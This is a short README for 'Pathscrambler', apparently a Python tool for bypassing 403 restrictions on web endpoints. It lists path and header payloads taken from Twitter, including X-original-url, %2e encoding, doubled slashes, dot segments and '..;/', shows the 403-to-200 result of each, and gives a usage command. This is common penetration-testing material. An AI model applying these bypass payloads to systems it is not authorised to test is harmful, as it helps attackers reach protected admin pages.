# Pathscrambler

Simple Tool written in python to bypass endpoint restriction currenty supports :

These payloads are directly pulled from twitter. Thanks to the community :)

--------------------------------------------------
```
GET /admin HTTP/1.1
Host: example.com     =>    403 Forbidden


GET /anything HTTP/1.1
Host: example.com
X-original-url: /admin =>   200 OK

GET /anything HTTP/1.1


https://www.example.com/path =>  403 Forbidden

https://www.example.com/%2e/path   =>  200 OK


https://www.example.com/admin       => 403

https://www.example.com/.           => 200

https://www.example/admin//         => 200

https://www.example/./admin/./      => 200


https://www.example.com/admin/      => 302

https://www.example.com/admin..;/   => 200
```


Command Example :

python3 pathscramblerpy -u "https://www.example/admin" where /admin returns 403
